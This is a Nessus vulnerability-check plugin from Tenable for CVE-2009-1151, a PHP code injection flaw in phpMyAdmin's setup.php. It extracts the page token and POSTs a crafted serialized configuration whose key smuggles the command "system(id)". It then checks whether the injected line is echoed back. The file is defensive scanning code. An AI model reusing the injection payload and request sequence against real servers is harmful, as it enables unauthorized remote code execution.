#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(36170);
  script_version("$Revision: 1.21 $");
  script_cvs_date("$Date: 2016/11/23 20:42:23 $");

  script_cve_id("CVE-2009-1151");
  script_bugtraq_id(34236);
  script_osvdb_id(53076);
  script_xref(name:"Secunia", value:"34430");

  script_name(english:"phpMyAdmin setup.php save Action Arbitrary PHP Code Injection (PMASA-2009-3)");
  script_summary(english:"Tries to inject PHP code into temporary config file");

  script_set_attribute( attribute:"synopsis",  value:
"The remote web server contains a PHP application that may allow
execution of arbitrary code."  );
  script_set_attribute( attribute:"description",  value:
"The setup script included with the version of phpMyAdmin installed on
the remote host does not properly sanitize user-supplied input to
several variables before using them to generate a config file for the
application.  Using specially crafted POST requests, an
unauthenticated, remote attacker may be able to leverage this issue to
execute arbitrary PHP code.

Note that the application is also reportedly affected by several other
issues, although Nessus has not actually checked for them.");
  script_set_attribute(
    attribute:"see_also", 
    value:"http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php"
  );
  script_set_attribute( attribute:"solution",  value:
"Upgrade to phpMyAdmin 2.11.9.5 / 3.1.3.1 or apply the patch referenced
in the project's advisory."  );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_core", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"Phpmyadmin File Upload");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");
  script_set_attribute(attribute:"exploited_by_malware", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'PhpMyAdmin Config File Code Injection');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'CANVAS');
  script_cwe_id(94);
  script_set_attribute(attribute:"plugin_publication_date", value: "2009/04/16");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:phpmyadmin:phpmyadmin");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009-2016 Tenable Network Security, Inc.");

  script_dependencies("phpMyAdmin_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/phpMyAdmin", "www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("url_func.inc");


port = get_http_port(default:80, embedded:FALSE, php:TRUE);


# Define some variables.
key = string(SCRIPT_NAME, "']; system(id); #");
val = 'NESSUS';
eoltype = "unix";


# Test an install.
install = get_kb_item(string("www/", port, "/phpMyAdmin"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # nb: phpMyAdmin 3.x has its setup script in a different location. We're not
  #     testing it because we don't believe the vulnerability is exploitable in
  #     that version.
  foreach script (make_list("/scripts/setup.php"))
  {
    url = string(dir, script);

    clear_cookiejar();
    res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

    # If the config can't be written to disk, this cannot be exploited - even
    # if the software is unpatched.  In which case, only continue if paranoid.
    if ('Can not load or save configuration' >< res[2])
    {
      if (report_paranoia < 2)
        exit(1, "The system might be unpatched, but cannot be exploited.");
      else
        config_writeable = FALSE;
    }
    else config_writeable = TRUE;

    # Extract the token.
    token = NULL;

    pat = 'input type="hidden" name="token" value="([^"]+)"';
    matches = egrep(string:res[2], pattern:pat);
    if (matches)
    {
      foreach match (split(matches, keep:FALSE))
      {
        item = eregmatch(pattern:pat, string:match);
        if (!isnull(item))
        {
          token = item[1];
          break;
        }
      }
    }
    if (isnull(token)) continue;

    # Try to exploit the issue.
    #
    # nb: we verify the vulnerability only by displaying the config file;
    #     if the config file is not writable, this will produce a result 
    #     even though the vulnerability is not really exploitable. 
    configuration = string(
      'a:1:{',
        's:7:"Servers";a:1:{',
          'i:0;a:1:{',
            's:', strlen(key), ':"', key, '";',
            's:', strlen(val), ':"', val, '";',
          '}',
        '}',
      '}'
    );
    postdata = string(
      "token=", token, "&",
      "action=display&",
      "configuration=", urlencode(str:configuration), "&",
      "eoltype=", eoltype
    );

    req = http_mk_post_req(
      port        : port,
      item        : url, 
      data        : postdata,
      add_headers : make_array(
        "Content-Type", "application/x-www-form-urlencoded"
      )
    );
    res = http_send_recv_req(port:port, req:req, exit_on_fail:TRUE);

    # There's a problem if our key was accepted.
    if (string("$cfg['Servers'][$i]['", key, "'] = '", val, "';") >< res[2])
    {
      if (!config_writeable)
      {
        report = string(
          "\n",
          "Even though the software is unpatched, the web server does not\n",
          "have permission to write the configuration file to disk, which\n",
          "means the vulnerability cannot be exploited at this time.\n"
        );
        security_hole(port:port, extra:report);
      }
      else security_hole(port);
    }
  }
}
